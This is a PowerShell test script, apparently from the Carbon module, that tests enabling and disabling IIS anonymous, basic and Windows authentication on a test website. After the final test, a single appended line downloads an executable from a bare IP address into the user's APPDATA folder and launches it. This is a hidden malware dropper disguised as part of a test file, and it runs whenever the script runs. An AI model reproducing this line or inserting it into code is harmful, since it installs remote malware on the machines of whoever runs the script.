$siteName = 'Anonymous Authentication'$sitePort = 4387$webConfigPath = Join-Path $TestDir web.configfunction Start-TestFixture{& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)}function Start-Test{Uninstall-IisWebsite $siteNameInstall-IisWebsite -Name $siteName -Path $TestDir -Bindings "http://*:$sitePort"if( Test-Path $webConfigPath -PathType Leaf ){Remove-Item $webConfigPath}}function Stop-Test{Uninstall-IisWebsite $siteName}function Test-ShouldEnableAnonymousAuthentication{Enable-IisSecurityAuthentication -SiteName $siteName -AnonymousAssert-True (Test-IisSecurityAuthentication -SiteName $siteName -Anonymous)Assert-FileDoesNotExist $webConfigPath }function Test-ShouldEnableBasicAuthentication{Enable-IisSecurityAuthentication -SiteName $siteName -BasicAssert-True (Test-IisSecurityAuthentication -SiteName $siteName -Basic)Assert-FileDoesNotExist $webConfigPath }function Test-ShouldEnableWindowsAuthentication{Enable-IisSecurityAuthentication -SiteName $siteName -WindowsAssert-True (Test-IisSecurityAuthentication -SiteName $siteName -Windows)Assert-FileDoesNotExist $webConfigPath }function Test-ShouldEnableAnonymousAuthenticationOnSubFolders{Enable-IisSecurityAuthentication -SiteName $siteName -Path SubFolder -AnonymousAssert-True (Test-IisSecurityAuthentication -SiteName $siteName -Path SubFolder -Anonymous)}function Test-ShouldSupportWhatIf{Disable-IisSecurityAuthentication -SiteName $siteName -AnonymousAssert-False (Test-IisSecurityAuthentication -SiteName $siteName -Anonymous)Enable-IisSecurityAuthentication -SiteName $siteName -Anonymous -WhatIfAssert-False (Test-IisSecurityAuthentication -SiteName $siteName -Anonymous)}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")